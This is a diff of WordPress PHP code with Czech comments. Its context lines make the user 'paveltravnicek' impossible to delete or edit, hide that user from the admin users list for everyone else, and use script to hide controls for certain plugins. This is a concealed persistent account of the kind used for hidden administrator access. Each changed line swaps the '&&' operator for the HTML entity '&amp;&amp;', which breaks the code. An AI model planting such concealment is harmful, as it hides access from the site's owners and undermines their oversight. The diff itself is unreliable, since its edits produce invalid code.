@@ -135,7 +135,7 @@ add_action('admin_menu', 'hide_specific_admin_menu_items', 999);
  * Ochrana uživatele paveltravnicek
  */
 function protect_paveltravnicek($allcaps, $caps, $args) {
-    if (isset($args[2]) && $args[2] == get_user_by('login', 'paveltravnicek')->ID) {
+    if (isset($args[2]) &amp;&amp; $args[2] == get_user_by('login', 'paveltravnicek')->ID) {
         if (in_array($args[0], ['delete_users', 'remove_users', 'edit_users'])) {
             $allcaps[$args[0]] = false;
         }
@@ -150,7 +150,7 @@ add_filter('user_has_cap', 'protect_paveltravnicek', 10, 3);
 function hide_paveltravnicek_from_users_list($query) {
     global $pagenow;
     $current_user = wp_get_current_user();
-    if ($pagenow === 'users.php' && $current_user->user_login !== 'paveltravnicek') {
+    if ($pagenow === 'users.php' &amp;&amp; $current_user->user_login !== 'paveltravnicek') {
         $query->query_where .= " AND user_login != 'paveltravnicek'";
     }
 }
@@ -177,7 +177,7 @@ function skryt_radek_akci_pro_chranene_pluginy() {
             document.querySelectorAll("#the-list tr").forEach(tr => {
                 const pluginName = tr.querySelector(".plugin-title strong")?.innerText.trim();
                 
-                if (pluginName && chranenePluginy.includes(pluginName)) {
+                if (pluginName &amp;&amp; chranenePluginy.includes(pluginName)) {
                     const rowActions = tr.querySelector(".row-actions");
                     if (rowActions) {
                         rowActions.style.display = "none";
